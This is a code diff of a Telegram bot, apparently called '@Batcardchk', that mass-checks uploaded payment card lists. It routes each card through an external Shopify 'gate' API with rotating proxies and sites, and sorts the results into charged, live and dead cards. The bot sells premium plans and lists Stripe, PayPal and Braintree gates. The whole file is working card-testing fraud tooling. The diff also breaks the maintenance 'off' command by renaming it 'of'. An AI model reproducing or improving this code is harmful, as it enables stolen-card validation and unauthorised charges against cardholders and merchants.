@@ -44,11 +44,11 @@ def get_bin_lookup_handler():
         try:
             data = await get_bin_info(bin6)
         except Exception as e:
-            await msg.edit_text(f"<b>❌ BIN lookup failed:</b> <code>{escape(str(e))}</code>", parse_mode="HTML")
+            await msg.edit_text(f"<b>{E_DECLINED} BIN lookup failed:</b> <code>{escape(str(e))}</code>", parse_mode="HTML")
             return
         if not data or data.get("error"):
             await msg.edit_text(
-                f"<b>❌ No BIN data found for <code>{bin6}</code></b>",
+                f"<b>{E_DECLINED} No BIN data found for <code>{bin6}</code></b>",
                 parse_mode="HTML"
             )
             return
@@ -97,40 +97,62 @@ from config import (
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 # CARD CLASSIFIER  (used by /msh)
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-CHARGED_RESPONSES = [
-    "charged","payment_intent.succeeded","amount_captured",
-    "captured successfully","payment captured","charge succeeded",
-    "order placed","order confirmed","order created",
-    "payment successful","transaction approved",
-]
-LIVE_RESPONSES = [
-    "approved","success","true","live",
-    "thank you for your order","order received",
-    "your order has been received",
-]
-DECLINED_RESPONSES = [
-    "declined","do_not_honor","insufficient funds","card declined",
-    "blocked","stolen","lost card","expired","security violation",
-    "restricted","not permitted","pickup card","revocation",
-    "fraud","limit exceeded","cvv","invalid card",
-]
-RETRY_ERRORS = [
-    "connection error","timeout","socket","ssl error",
-    "network","rate limit","too many requests",
-    "service unavailable","gateway timeout","502","503","504",
-]
-
 def classify_response(resp_text: str) -> str:
-    """Return 'CHARGED', 'LIVE', 'DEAD', 'RETRY', or 'ERROR'."""
-    low = resp_text.lower()
-    for kw in CHARGED_RESPONSES:
-        if kw in low: return "CHARGED"
-    for kw in LIVE_RESPONSES:
-        if kw in low: return "LIVE"
-    for kw in DECLINED_RESPONSES:
-        if kw in low: return "DEAD"
-    for kw in RETRY_ERRORS:
-        if kw in low: return "RETRY"
+    """
+    Return 'CHARGED', 'LIVE', 'DEAD', 'RETRY', or 'ERROR'.
+    Works on raw gate responses (ORDER_PAID, DECLINED, etc.)
+    Case-insensitive — checks both upper and lower so nothing is missed.
+    """
+    mu = resp_text.upper()
+    ml = resp_text.lower()
+
+    # ── CHARGED — real money taken ────────────────────────────────
+    if any(x in mu for x in (
+        "ORDER_PAID", "ORDER PAID", "CHARGED", "CAPTURED",
+        "PAYMENT_INTENT.SUCCEEDED", "AMOUNT_CAPTURED",
+        "PAYMENT CAPTURED", "CHARGE SUCCEEDED",
+        "ORDER PLACED", "ORDER CONFIRMED", "ORDER CREATED",
+        "PAYMENT SUCCESSFUL", "TRANSACTION APPROVED",
+    )):
+        return "CHARGED"
+
+    # ── TDS / 3D Secure ──────────────────────────────────────────
+    if any(x in mu for x in ("3DS_REQUIRED", "3D_SECURE", "3D SECURE", "THREE_D_SECURE")):
+        return "TDS"
+
+    # ── LIVE — card valid but not charged ────────────────────────
+    if any(x in mu for x in (
+        "INSUFFICIENT_FUNDS", "INCORRECT_CVV", "INCORRECT_CVC",
+        "INCORRECT_ZIP", "DO_NOT_HONOR", "DO NOT HONOR",
+        "APPROVED", "SUCCESS", "THANK YOU FOR YOUR ORDER",
+        "ORDER RECEIVED",
+    )):
+        return "LIVE"
+
+    # ── DEAD — hard decline ──────────────────────────────────────
+    if any(x in mu for x in (
+        "CARD_DECLINED", "DECLINED", "GENERIC_DECLINE",
+        "PROCESSING_ERROR", "PICK_UP_CARD", "FRAUD_SUSPECTED",
+        "STOLEN", "LOST_CARD", "EXPIRED_CARD", "RESTRICTED_CARD",
+        "TRANSACTION_NOT_ALLOWED", "INVALID_CARD", "SECURITY_VIOLATION",
+        "CALL_ISSUER", "REVOCATION", "BLOCKED",
+    )):
+        return "DEAD"
+
+    # ── RETRY — site/proxy/infra errors ─────────────────────────
+    _retry_keywords = [
+        "connection error", "timeout", "ssl error", "network",
+        "rate limit", "too many requests", "service unavailable",
+        "gateway timeout", "site error", "proxy error",
+        "hcaptcha", "no valid product", "not shopify",
+        "step 0 failed", "step 1 failed", "step 2 failed",
+        "step 3 failed", "na", "curl error", "could not resolve",
+    ]
+    if any(x in ml for x in _retry_keywords):
+        return "RETRY"
+    if any(x in mu for x in ("502", "503", "504", "429")):
+        return "RETRY"
+
     return "ERROR"
 
 from mass import get_mass_handlers
@@ -455,7 +477,7 @@ def ui_full_profile(user, context: ContextTypes.DEFAULT_TYPE) -> str:
         _msh_used   = ud.get("msh_daily_cards", 0) if _msh_date == _today else 0
         _msh_remain = max(0, 500 - _msh_used)
         _msh_status = (
-            f"✅ Available ({_msh_remain} cards left)"
+            f"{E_LIVE} Available ({_msh_remain} cards left)"
             if _msh_used == 0
             else (
                 f"🔒 Used ({_msh_used}/500 cards) — resets tomorrow"
@@ -577,7 +599,7 @@ def kb_force_sub(not_joined: list) -> RawMarkup:
     rows = []
     for uname, link, label in not_joined:
         rows.append([_btn(f"{label}  ➳  @{uname}", url=link, style="primary")])
-    rows.append([_btn("✅  I Joined All — Verify Now", cb="check_sub", style="primary")])
+    rows.append([_btn("I Joined All — Verify Now", cb="check_sub", style="primary")])
     return RawMarkup(rows)
 
 
@@ -693,9 +715,9 @@ def kb_back(cb: str) -> RawMarkup:
 
 def kb_price() -> RawMarkup:
     return RawMarkup([
-        [_btn("⭐ " + B("10$ — CORE"),  cb="pay10", style="primary"),
-         _btn("⭐ " + B("15$ — ELITE"), cb="pay15", style="primary"),
-         _btn("⭐ " + B("30$ — ROOT"),  cb="pay30", style="primary")],
+        [_btn(B("10$ — CORE"),  cb="pay10", style="primary"),
+         _btn(B("15$ — ELITE"), cb="pay15", style="primary"),
+         _btn(B("30$ — ROOT"),  cb="pay30", style="primary")],
         [_btn("🆘 " + B("SUPPORT"),     url=SUPPORT_LINK, style="primary")],
         [_btn("🔙 " + B("BACK"),        cb="bmain")],
     ])
@@ -708,15 +730,15 @@ def kb_payment() -> RawMarkup:
 
 def kb_gate_main() -> RawMarkup:
     return RawMarkup([
-        [_btn("🔐 " + B("AUTH"),    cb="mauth",   style="primary"),
-         _btn("💳 " + B("CHARGE"),  cb="mcharge", style="primary"),
-         _btn("👑 " + B("PREMIUM"), cb="mmass",   style="primary")],
+        [_btn(B("AUTH"),    cb="mauth",   style="primary"),
+         _btn(B("CHARGE"),  cb="mcharge", style="primary"),
+         _btn(B("PREMIUM"), cb="mmass",   style="primary")],
         [_btn("🔙 " + B("BACK"),    cb="bmain")],
     ])
 
 def kb_auth_gates() -> RawMarkup:
     return RawMarkup([
-        [_btn("🔐 " + B("BRAINTREE AUTH"), cb="ib3", style="primary")],
+        [_btn(B("BRAINTREE AUTH"), cb="ib3", style="primary")],
         [_btn("🔙 " + B("BACK"),           cb="mgates")],
     ])
 
@@ -731,58 +753,58 @@ def kb_charge_gates() -> RawMarkup:
 def kb_premium_gates() -> RawMarkup:
     return RawMarkup([
         [_btn(B("Shopify 0-20$"),          cb="imsh",  style="primary"),
-         _btn(B("Stripe Auth") + " 👑",    cb="iau",   style="primary")],
-        [_btn(B("Stripe Mass") + " 👑",    cb="imss",  style="primary"),
-         _btn(B("PayPal Mass") + " 👑",    cb="impp2", style="primary")],
+         _btn(B("Stripe Auth"),    cb="iau",   style="primary")],
+        [_btn(B("Stripe Mass"),    cb="imss",  style="primary"),
+         _btn(B("PayPal Mass"),    cb="impp2", style="primary")],
         [_btn(B("Back"),                    cb="mgates", style="danger")],
     ])
 
 def kb_upgrade() -> RawMarkup:
     return RawMarkup([
-        [_btn("💎 " + B("BUY PREMIUM"), cb="mprice",     style="primary")],
+        [_btn(B("BUY PREMIUM"), cb="mprice",     style="primary")],
         [_btn("🆘 " + B("SUPPORT"),     url=SUPPORT_LINK)],
     ])
 
 def kb_cooldown() -> RawMarkup:
     return RawMarkup([
-        [_btn("💎 " + B("BUY PREMIUM") + " — No Cooldown", cb="mprice", style="primary")],
+        [_btn(B("BUY PREMIUM") + " — No Cooldown", cb="mprice", style="primary")],
     ])
 
 def kb_result_raw(is_premium: bool = False) -> RawMarkup:
     if is_premium:
         return RawMarkup([
-            [_btn("🤖 " + B("Open Bot"), url=BOT_LINK,      style="primary"),
-             _btn("📢 " + B("Channel"),  url=CHANNEL_LINK,  style="primary")],
+            [_btn(B("Open Bot"), url=BOT_LINK,      style="primary"),
+             _btn(B("Channel"),  url=CHANNEL_LINK,  style="primary")],
         ])
     return RawMarkup([
-        [_btn("💎 " + B("BUY PREMIUM") + " — Unlimited Checks", cb="mprice", style="primary")],
-        [_btn("📢 @Batcardchk", url=CHANNEL_LINK)],
+        [_btn(B("BUY PREMIUM") + " — Unlimited Checks", cb="mprice", style="primary")],
+        [_btn("@Batcardchk", url=CHANNEL_LINK)],
     ])
 
 def kb_msh_result(task_id: str, charged: int, live: int,
                   total: int, is_premium: bool) -> RawMarkup:
     """End-of-check keyboard: Charged / Live / All download buttons."""
     row1 = [
-        _btn(f"💎 Charged ({charged})",
+        _btn(f"Charged ({charged})",
              cb=f"dl_charged_{task_id}", style="primary",
              icon=BTN_CHARGED_EMOJI_ID),
-        _btn(f"✅ Live ({live})",
+        _btn(f"Live ({live})",
              cb=f"dl_live_{task_id}", style="primary",
              icon=BTN_LIVE_EMOJI_ID),
-        _btn(f"📋 All ({total})",
+        _btn(f"All ({total})",
              cb=f"dl_all_{task_id}",
              icon=BTN_ALL_EMOJI_ID),
     ]
     rows = [row1]
     if not is_premium:
-        rows.append([_btn("💎 " + B("BUY PREMIUM") + " — Unlimited",
+        rows.append([_btn(B("BUY PREMIUM") + " — Unlimited",
                           cb="mprice", style="primary")])
     return RawMarkup(rows)
 
 def kb_fb_owner(key: str) -> RawMarkup:
     return RawMarkup([[
-        _btn("✅ Approve", cb=f"fb_ok_{key}", style="primary"),
-        _btn("❌ Decline", cb=f"fb_no_{key}", style="danger"),
+        _btn("Approve", cb=f"fb_ok_{key}", style="primary"),
+        _btn("Decline", cb=f"fb_no_{key}", style="danger"),
     ]])
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
@@ -1518,7 +1540,7 @@ async def cmd_find(update: Update, context: ContextTypes.DEFAULT_TYPE):
             _btn(f"{E_DECLINED} Ban",    cb=f"owner_ban_{uid}",   style="danger"),
             _btn(f"{E_LIVE} Unban",      cb=f"owner_unban_{uid}", style="primary"),
         ],
-        [_btn(f"💎 Grant Plan via /sub {uid}", cb=f"find_sub_{uid}", style="primary")],
+        [_btn(f"Grant Plan via /sub {uid}", cb=f"find_sub_{uid}", style="primary")],
     ])
     await update.message.reply_text(txt, parse_mode="HTML", reply_markup=kb)
 
@@ -1944,7 +1966,7 @@ async def cmd_maintenance(update: Update, context: ContextTypes.DEFAULT_TYPE):
         state = context.bot_data.get("maintenance", False)
         await update.message.reply_text(
             f"Maintenance is currently: <b>{'ON' if state else 'OFF'}</b>\n"
-            "Use: /maintenance on|off",
+            "Use: /maintenance on|of",
             parse_mode="HTML"
         )
         return
@@ -1954,13 +1976,13 @@ async def cmd_maintenance(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text(
             f"<b>{E_ERRORS} {B('Maintenance Mode ON.')}</b> Users cannot use commands.", parse_mode="HTML"
         )
-    elif arg in ("off", "0", "false"):
+    elif arg in ("of", "0", "false"):
         context.bot_data["maintenance"] = False
         await update.message.reply_text(
             f"<b>{E_LIVE} {B('Maintenance Mode OFF.')}</b> Bot is live.", parse_mode="HTML"
         )
     else:
-        await update.message.reply_text("Use: /maintenance on|off")
+        await update.message.reply_text("Use: /maintenance on|of")
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 # USER COMMANDS
@@ -2037,17 +2059,17 @@ async def cmd_sub(update: Update, context: ContextTypes.DEFAULT_TYPE):
         )
         kb = RawMarkup([
             [
-                _btn("⭐ CORE · 7d",   cb=f"ogs_CORE_7_{target_id}",
+                _btn("CORE · 7d",   cb=f"ogs_CORE_7_{target_id}",
                      style="primary", icon=PROG_LIVE_EMOJI_ID),
-                _btn("💎 ELITE · 15d", cb=f"ogs_ELITE_15_{target_id}",
+                _btn("ELITE · 15d", cb=f"ogs_ELITE_15_{target_id}",
                      style="primary", icon=PROG_LIVE_EMOJI_ID),
-                _btn("👑 ROOT · 30d",  cb=f"ogs_ROOT_30_{target_id}",
+                _btn("ROOT · 30d",  cb=f"ogs_ROOT_30_{target_id}",
                      style="primary", icon=PROG_LIVE_EMOJI_ID),
             ],
             [
-                _btn("⭐ CORE · 15d",  cb=f"ogs_CORE_15_{target_id}",  style="primary"),
-                _btn("💎 ELITE · 30d", cb=f"ogs_ELITE_30_{target_id}", style="primary"),
-                _btn("👑 ROOT · 60d",  cb=f"ogs_ROOT_60_{target_id}",  style="primary"),
+                _btn("CORE · 15d",  cb=f"ogs_CORE_15_{target_id}",  style="primary"),
+                _btn("ELITE · 30d", cb=f"ogs_ELITE_30_{target_id}", style="primary"),
+                _btn("ROOT · 60d",  cb=f"ogs_ROOT_60_{target_id}",  style="primary"),
             ],
             [_btn(f"{E_DECLINED} Remove Plan", cb=f"owner_resub_{target_id}",
                   style="danger", icon=PROG_DEAD_EMOJI_ID)],
@@ -2094,7 +2116,7 @@ async def cmd_sub(update: Update, context: ContextTypes.DEFAULT_TYPE):
         f"──────────"
     )
     kb = RawMarkup([
-        [_btn("💎 " + B("Upgrade Plan"), cb="mprice", style="primary")],
+        [_btn(B("Upgrade Plan"), cb="mprice", style="primary")],
     ]) if not premium else None
     await update.message.reply_text(txt, parse_mode="HTML", reply_markup=kb)
 
@@ -2141,7 +2163,7 @@ async def cmd_msh(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
     if not await require_not_banned(update, context): return
     if context.bot_data.get("maintenance") and user.id != OWNER_ID:
-        await update.message.reply_text("⚠️ Bot is under maintenance. Try again later.", parse_mode="HTML")
+        await update.message.reply_text(f"{E_ERRORS} Bot is under maintenance. Try again later.", parse_mode="HTML")
         return
     if not context.bot_data.get("msh_on", True):
         await update.message.reply_text(f"<b>{E_ERRORS} Shopify Mass gate is currently OFF.</b>", parse_mode="HTML")
@@ -2191,14 +2213,14 @@ async def cmd_msh(update: Update, context: ContextTypes.DEFAULT_TYPE):
     )
     if doc:
         if doc.mime_type not in ("text/plain", "application/octet-stream"):
-            await update.message.reply_text("<b>❌ Please send a .txt file with cards (one per line).</b>", parse_mode="HTML")
+            await update.message.reply_text(f"<b>{E_DECLINED} Please send a .txt file with cards (one per line).</b>", parse_mode="HTML")
             return
         try:
             file    = await doc.get_file()
             content = (await file.download_as_bytearray()).decode("utf-8", errors="ignore")
             cards   = [l.strip() for l in content.splitlines() if l.strip() and "|" in l]
         except Exception as e:
-            await update.message.reply_text(f"<b>❌ Error reading file: {escape(str(e))}</b>", parse_mode="HTML")
+            await update.message.reply_text(f"<b>{E_DECLINED} Error reading file: {escape(str(e))}</b>", parse_mode="HTML")
             return
     else:
         txt = ""
@@ -2307,187 +2329,202 @@ async def cmd_msh(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     GOSHOPI = "https://goshopi.up.railway.app/shopii"
 
-    # ── Concurrency primitives ──────────────────────────────────────
-    # 20 parallel requests — fast without hammering the gate API
-    sem   = asyncio.Semaphore(20)
-    # Protects shared counters that multiple coroutines update
-    _lock = asyncio.Lock()
+    # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+    # SPEED SETTINGS — one card at a time, full 120 s timeout
+    # This gives the real Shopify gate time to respond properly.
+    # Cards are checked sequentially so every response is real.
+    # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+    CARD_TIMEOUT       = 120   # seconds per card
+    DELAY_BETWEEN      = 3     # seconds between cards (don't hammer gate)
+    MAX_RETRIES        = 1     # retry once on RETRY/ERROR with a different site
+    CONNECTOR_LIMIT    = 5
 
-    # ── Periodic progress reporter (runs every 3 s independently) ──
+    # ── Helpers ─────────────────────────────────────────────────────
+    def _clean_site(s: str) -> str:
+        for pfx in ("https://", "http://"):
+            if s.startswith(pfx):
+                s = s[len(pfx):]
+        return s.rstrip("/")
+
     def _build_progress_text(checked: int, elapsed: float) -> str:
+        mins = int(elapsed // 60)
+        secs = int(elapsed % 60)
+        ts   = f"{mins}m {secs}s" if mins else f"{secs}s"
         return (
-            f"{E_GATE} <b>Gate</b> ➳ Shopify\n"
+            f"{E_GATE} <b>Gate</b> ➳ Shopify 0-20$\n"
             f"{E_PROGRESS} <b>Progress</b> ➳ {checked}/{total}\n"
             f"{E_CHARGED} <b>Charged</b> ➳ {charged_count}\n"
             f"{E_LIVE} <b>Live</b> ➳ {live_count}\n"
             f"{E_DECLINED} <b>Dead</b> ➳ {dead_count}\n"
             f"{E_ERRORS} <b>Errors</b> ➳ {error_count}\n"
-            f"{E_TIME} <b>Time</b> ➳ {int(elapsed)}s\n"
+            f"{E_TIME} <b>Time</b> ➳ {ts}\n"
             f"{E_USER} ➳ {escape(uname)} {E_PRO}\n"
             f"{E_DEV} ➳ {BOT_NAME} {E_PRO}"
         )
 
-    def _build_progress_kb() -> RawMarkup:
-        chk = live_count + dead_count + error_count
-        return RawMarkup([
-            [
-                _btn(f"💎 Charged ({charged_count})",
-                     cb=f"dl_charged_{task_id}", style="primary",
-                     icon=BTN_CHARGED_EMOJI_ID),
-                _btn(f"✅ Live ({live_count})",
-                     cb=f"dl_live_{task_id}", style="primary",
-                     icon=BTN_LIVE_EMOJI_ID),
-                _btn(f"📋 All ({chk})",
-                     cb=f"dl_all_{task_id}",
-                     icon=BTN_ALL_EMOJI_ID),
-            ],
-            [_btn("🛑 Stop", cb=f"stop_msh_{task_id}", style="danger",
-                  icon=BTN_STOP_EMOJI_ID)],
-        ])
+    def _build_progress_kb(running: bool = True) -> RawMarkup:
+        chk = live_count + dead_count + error_count + charged_count
+        row1 = [
+            _btn(f"Charged ({charged_count})", cb=f"dl_charged_{task_id}",
+                 style="primary", icon=BTN_CHARGED_EMOJI_ID),
+            _btn(f"Live ({live_count})", cb=f"dl_live_{task_id}",
+                 style="primary", icon=BTN_LIVE_EMOJI_ID),
+            _btn(f"All ({chk})", cb=f"dl_all_{task_id}", icon=BTN_ALL_EMOJI_ID),
+        ]
+        rows = [row1]
+        if running:
+            rows.append([_btn("Stop", cb=f"stop_msh_{task_id}",
+                              style="danger", icon=BTN_STOP_EMOJI_ID)])
+        return RawMarkup(rows)
 
-    async def _progress_loop():
-        while True:
-            await asyncio.sleep(3)
-            checked = live_count + dead_count + error_count
-            elapsed = time.time() - start_time
+    # ── Single-card API call — tries once, returns (verdict, resp_text, price, currency) ─
+    async def _call_goshopi(session, card: str, site: str, proxy) -> tuple:
+        params: dict = {"cc": card, "site": site}
+        if proxy:
+            params["proxy"] = proxy
+        try:
+            async with session.get(
+                GOSHOPI, params=params,
+                timeout=_aiohttp.ClientTimeout(total=CARD_TIMEOUT)
+            ) as resp:
+                try:
+                    data = await resp.json(content_type=None)
+                except Exception:
+                    raw = await resp.text()
+                    data = {"Response": raw}
+
+            if not isinstance(data, dict):
+                data = {"Response": str(data)}
+
+            # Extract the real response text — goshopi key order
+            resp_text = ""
+            for k in ("Response", "response", "value", "message", "category"):
+                v = data.get(k)
+                if v and str(v).strip() not in ("", "null", "None", "false", "true"):
+                    resp_text = str(v).strip()
+                    break
+            if not resp_text:
+                resp_text = str(data)[:150]
+
+            price    = str(data.get("Price",    data.get("price",    "0.00"))).strip()
+            currency = str(data.get("Currency", data.get("currency", "USD"))).strip()
+            verdict  = classify_response(resp_text)
+            return verdict, resp_text, price, currency
+
+        except asyncio.TimeoutError:
+            return "RETRY", "TIMEOUT — gate took too long", "0.00", "USD"
+        except Exception as e:
+            return "ERROR", f"CONNECTION_ERROR: {str(e)[:80]}", "0.00", "USD"
+
+    # ── Sequential card checker — one card at a time ─────────────────
+    async def _check_sequential(cards_list: list, session) -> None:
+        nonlocal live_count, dead_count, error_count, charged_count
+        nonlocal credits_used, stopped_no_credits
+
+        for card in cards_list:
+            # Stop check
+            if not context.bot_data.get("msh_tasks", {}).get(task_id, {}).get("running", True):
+                break
+            # Credit check for trial
+            if is_trial and ud.get("credits", 0) <= 0:
+                stopped_no_credits = True
+                break
+
+            site  = _clean_site(random.choice(sites))
+            proxy = random.choice(proxies) if proxies else None
+
+            verdict, resp_text, price, currency = await _call_goshopi(
+                session, card, site, proxy
+            )
+
+            # ── Retry once on RETRY/ERROR with a different site/proxy ──
+            if verdict in ("RETRY", "ERROR") and MAX_RETRIES > 0:
+                await asyncio.sleep(2)
+                site2  = _clean_site(random.choice(sites))
+                proxy2 = random.choice(proxies) if proxies else None
+                verdict, resp_text, price, currency = await _call_goshopi(
+                    session, card, site2, proxy2
+                )
+
+            # ── Count results ──────────────────────────────────────────
+            if verdict == "CHARGED":
+                charged_count += 1
+                live_hits.append(f"<code>{escape(card)}</code> ➳ {escape(resp_text[:80])}")
+                live_hits_raw.append(card)
+                all_checked_raw.append(f"[CHARGED] {card} | {resp_text}")
+            elif verdict in ("LIVE", "TDS"):
+                live_count += 1
+                tag = "[TDS]  " if verdict == "TDS" else "[LIVE] "
+                live_hits.append(f"<code>{escape(card)}</code> ➳ {escape(resp_text[:80])}")
+                live_hits_raw.append(card)
+                all_checked_raw.append(f"{tag} {card} | {resp_text}")
+            elif verdict == "DEAD":
+                dead_count += 1
+                all_checked_raw.append(f"[DEAD]  {card} | {resp_text}")
+            else:
+                error_count += 1
+                all_checked_raw.append(f"[ERROR] {card} | {resp_text}")
+
+            if is_trial:
+                ud["credits"] = max(0, ud.get("credits", 0) - 1)
+                credits_used += 1
+
+            # ── DM on CHARGED ──────────────────────────────────────────
+            if verdict == "CHARGED":
+                try:
+                    await context.bot.send_message(
+                        chat_id=user.id,
+                        text=(
+                            f"{E_CHARGED} <b>CHARGED #{charged_count}</b>\n"
+                            f"──────────\n"
+                            f"<b>{E_CARD}</b>\n"
+                            f"<b>   ⤷ <code>{escape(card)}</code></b>\n"
+                            f"<b>Gate ➳ Shopify | {escape(price)} {escape(currency)}</b>\n"
+                            f"──────────\n"
+                            f"<b>Resp ➳ {escape(resp_text[:100])}</b>\n"
+                            f"──────────\n"
+                            f"{E_DEV} ➳ {BOT_NAME} {E_PRO}"
+                        ),
+                        parse_mode="HTML",
+                    )
+                except Exception:
+                    pass
+
+            # ── Live progress update after each card ───────────────────
+            checked_now = charged_count + live_count + dead_count + error_count
+            elapsed     = time.time() - start_time
             try:
                 await msg.edit_text(
-                    _build_progress_text(checked, elapsed),
+                    _build_progress_text(checked_now, elapsed),
                     parse_mode="HTML",
-                    reply_markup=_build_progress_kb()
+                    reply_markup=_build_progress_kb(running=True),
                 )
             except Exception:
                 pass
 
-    # ── Per-card concurrent worker ──────────────────────────────────
-    async def _check_one(card: str, session: "_aiohttp.ClientSession") -> None:
-        nonlocal live_count, dead_count, error_count, charged_count, credits_used, stopped_no_credits
-        # Fast pre-check before waiting for semaphore
-        if not context.bot_data.get("msh_tasks", {}).get(task_id, {}).get("running", True):
-            return
-        if is_trial and ud.get("credits", 0) <= 0:
-            async with _lock:
-                stopped_no_credits = True
-            return
-
-        async with sem:
-            # Re-check inside semaphore (another worker may have stopped)
+            # ── Delay between cards ────────────────────────────────────
             if not context.bot_data.get("msh_tasks", {}).get(task_id, {}).get("running", True):
-                return
-            if is_trial and ud.get("credits", 0) <= 0:
-                async with _lock:
-                    stopped_no_credits = True
-                return
+                break
+            await asyncio.sleep(DELAY_BETWEEN)
 
-            site = random.choice(sites)
-            for pfx in ("https://", "http://"):
-                if site.startswith(pfx):
-                    site = site[len(pfx):]
-            site = site.rstrip("/")
-            proxy = random.choice(proxies) if proxies else None
-            params: dict = {"cc": card, "site": site}
-            if proxy:
-                params["proxy"] = proxy
-
-            resp_text = ""
-            try:
-                async with session.get(
-                    GOSHOPI, params=params,
-                    timeout=_aiohttp.ClientTimeout(total=15)
-                ) as resp:
-                    try:
-                        data = await resp.json(content_type=None)
-                    except Exception:
-                        data = {"value": await resp.text()}
-                for k in ("value", "message", "Response", "response", "category", "status"):
-                    v = data.get(k)
-                    if v and str(v).strip() not in ("", "null", "None"):
-                        resp_text = str(v).strip()
-                        break
-                if not resp_text:
-                    resp_text = str(data)[:80]
-
-                verdict = classify_response(resp_text)
-
-                async with _lock:
-                    if verdict == "CHARGED":
-                        charged_count += 1
-                        live_count    += 1
-                        live_hits.append(
-                            f"<code>{escape(card)}</code> ➳ {escape(resp_text[:60])}"
-                        )
-                        live_hits_raw.append(card)
-                        all_checked_raw.append(f"[CHARGED] {card} | {resp_text[:60]}")
-                    elif verdict == "LIVE":
-                        live_count += 1
-                        live_hits.append(
-                            f"<code>{escape(card)}</code> ➳ {escape(resp_text[:60])}"
-                        )
-                        live_hits_raw.append(card)
-                        all_checked_raw.append(f"[LIVE]  {card} | {resp_text[:60]}")
-                    elif verdict == "DEAD":
-                        dead_count += 1
-                        all_checked_raw.append(f"[DEAD]  {card} | {resp_text[:60]}")
-                    else:  # RETRY / ERROR
-                        error_count += 1
-                        all_checked_raw.append(f"[ERROR] {card}")
-                    if is_trial:
-                        ud["credits"] = max(0, ud.get("credits", 0) - 1)
-                        credits_used += 1
-
-                # ── DM only for CHARGED cards ─────────────────────────
-                if verdict == "CHARGED":
-                    try:
-                        await context.bot.send_message(
-                            chat_id=update.effective_user.id,
-                            text=(
-                                f"{E_CHARGED} <b>CHARGED #{charged_count}</b>\n"
-                                f"──────────\n"
-                                f"<code>{escape(card)}</code>\n"
-                                f"<b>Response:</b> {escape(resp_text[:100])}\n"
-                                f"<b>Gate:</b> Shopify 0-20$\n"
-                                f"{E_DEV} ➳ {BOT_NAME} {E_PRO}"
-                            ),
-                            parse_mode="HTML",
-                        )
-                    except Exception:
-                        pass
-
-            except Exception:
-                async with _lock:
-                    error_count += 1
-                    all_checked_raw.append(f"[ERROR] {card}")
-                    if is_trial:
-                        ud["credits"] = max(0, ud.get("credits", 0) - 1)
-                        credits_used += 1
-
-    # ── Run all workers concurrently ───────────────────────────────
-    progress_task = asyncio.create_task(_progress_loop())
+    # ── Run ─────────────────────────────────────────────────────────
     connector = _aiohttp.TCPConnector(
-        limit=60,
+        limit=CONNECTOR_LIMIT,
         ttl_dns_cache=300,
         enable_cleanup_closed=True,
-        force_close=False,
     )
     try:
         async with _aiohttp.ClientSession(
             connector=connector,
-            timeout=_aiohttp.ClientTimeout(total=20),
+            timeout=_aiohttp.ClientTimeout(total=None),  # no session-level cap; per-card handles it
         ) as session:
-            await asyncio.gather(
-                *[asyncio.create_task(_check_one(card, session)) for card in cards],
-                return_exceptions=True,
-            )
-    finally:
-        progress_task.cancel()
-        try:
-            await progress_task
-        except asyncio.CancelledError:
-            pass
+            await _check_sequential(cards, session)
+    except Exception:
+        pass
 
     context.bot_data.get("msh_tasks", {}).pop(task_id, None)
     elapsed = time.time() - start_time
-    checked = live_count + dead_count + error_count
+    checked = charged_count + live_count + dead_count + error_count
 
     # ── Store results for download buttons (kept for 2 h) ─────────
     context.bot_data.setdefault("msh_results", {})[task_id] = {
@@ -2505,7 +2542,7 @@ async def cmd_msh(update: Update, context: ContextTypes.DEFAULT_TYPE):
         if stopped_no_credits:
             trial_footer += (
                 "\n──────────\n"
-                "⚠️ <b>Stopped — credits exhausted!</b>\n"
+                f"{E_ERRORS} <b>Stopped — credits exhausted!</b>\n"
                 "Buy more credits from the owner to continue."
             )
     else:
@@ -2513,15 +2550,17 @@ async def cmd_msh(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     stop_label = "Stopped" if stopped_no_credits else "Done"
     suffix = f"\n⚠️ <b>No credits left — stopped early.</b>" if stopped_no_credits else ""
+    mins_e = int(elapsed // 60); secs_e = int(elapsed % 60)
+    ts_e   = f"{mins_e}m {secs_e}s" if mins_e else f"{secs_e}s"
     try:
         await msg.edit_text(
-            f"{E_GATE} <b>Gate</b> ➳ Shopify\n"
-            f"{E_PROGRESS} <b>Progress</b> ➳ {checked}/{total}\n"
+            f"{E_GATE} <b>Gate</b> ➳ Shopify 0-20$\n"
+            f"{E_PROGRESS} <b>Progress</b> ➳ {checked}/{total} — Done\n"
             f"{E_CHARGED} <b>Charged</b> ➳ {charged_count}\n"
             f"{E_LIVE} <b>Live</b> ➳ {live_count}\n"
             f"{E_DECLINED} <b>Dead</b> ➳ {dead_count}\n"
             f"{E_ERRORS} <b>Errors</b> ➳ {error_count}\n"
-            f"{E_TIME} <b>Time</b> ➳ {elapsed:.1f}s\n"
+            f"{E_TIME} <b>Time</b> ➳ {ts_e}\n"
             f"{E_USER} ➳ {escape(uname)} {E_PRO}\n"
             f"{E_DEV} ➳ {BOT_NAME} {E_PRO}"
             f"{trial_footer}{suffix}",
@@ -2944,7 +2983,7 @@ async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await query.message.edit_text(
             f"<b>👑 {B('Mass Gates')}</b>\n──────────\n"
             "Select a mass gate below.\n"
-            "👑 gates require premium.\n──────────",
+            f"Gates require premium.\n──────────",
             parse_mode="HTML", reply_markup=kb_premium_gates()
         )
         return
@@ -2968,7 +3007,7 @@ async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         _today  = datetime.now().strftime("%Y-%m-%d")
         if prem_i:
             limit_line   = "Unlimited"
-            status_line  = "✅ Available"
+            status_line  = f"{E_LIVE} Available"
             credits_line = "∞"
         else:
             _used    = ud_i.get("msh_daily_cards", 0) if ud_i.get("msh_daily_date", "") == _today else 0
